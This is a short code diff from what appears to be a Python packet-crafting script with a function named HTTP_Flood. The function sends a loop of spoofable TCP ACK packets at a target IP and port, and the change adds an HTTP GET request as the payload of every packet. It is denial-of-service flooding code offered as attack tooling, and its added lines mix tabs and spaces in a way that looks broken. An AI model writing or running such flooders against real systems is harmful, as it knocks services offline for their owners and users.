@@ -29,8 +29,9 @@ def HTTP_Flood(dstIP,dstPort,counter):
 		TCP_Packet.dport = dstPort
 		TCP_Packet.flags = "A"
 		TCP_Packet.seq = s_eq
-
-		send(IP_Packet/TCP_Packet)
+        
+        HTTP_payload = f"GET / HTTP/1.0\r\nHOST: {dstIP}\r\n\r\n"
+		send(IP_Packet/TCP_Packet/HTTP_payload)
 		total+=1
 
 	print("\nTotal packets sent: %i\n" % total)
